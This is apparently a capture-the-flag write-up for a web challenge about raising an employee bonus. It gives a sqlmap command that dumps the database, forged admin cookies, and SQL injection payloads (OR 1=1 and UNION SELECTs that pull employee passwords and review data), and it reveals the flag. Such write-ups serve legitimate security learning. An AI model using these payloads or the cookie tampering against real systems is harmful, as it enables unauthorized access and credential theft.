# [web] Fine, I'll increase my bonus myself &mdash; Write Up

## One-liner command

Since this challenge is pretty much SQLi but three times, `sqlmap -u "${challengeReview}$/review.php" --cookie="vmm_is_admin=true;vmm_logged_in=true" --dump --forms --flush-session --fresh-queries` dumps the entire database with the flag.

## Longer method

### Login page

`username` and `password` are susceptible to SQLi. Log in as any employee. It doesn't really matter either since there are three cookies: `vmm_auth`, `vmm_is_admin` and `vmm_logged_in`. We can edit `vmm_is_admin` and `vmm_logged_in` and set them to `true`.

### Search page

The search field has SQLi as well. You can play around and find out that entering

```sql
' OR 1 = 1 --
```

in the search field returns a lot more employees than usual. Our target is anyone working in Administration, since they can provide access to the Reviews page.

If we use a `UNION`, we can see the password of all these users with

```sql
' OR 1 = 1 UNION SELECT username, password, NULL, NULL, NULL FROM employees --
```

### Review page

Logging in as an admin, we can access the review page. Again, the search field is susceptible to SQLi. Reading the admin note at the top of the page, we can see that it is talking about bonuses. Perhaps a `bonus` field in the table?

Entering

```sql
' UNION SELECT * FROM employee_reviews --
```

in the field gives us the bonuses as well as the flag, `InductionCTF{p4yd4y_p4yd4y_1n7171473_b0nu5_upgr4d3_pr070c0l}`.
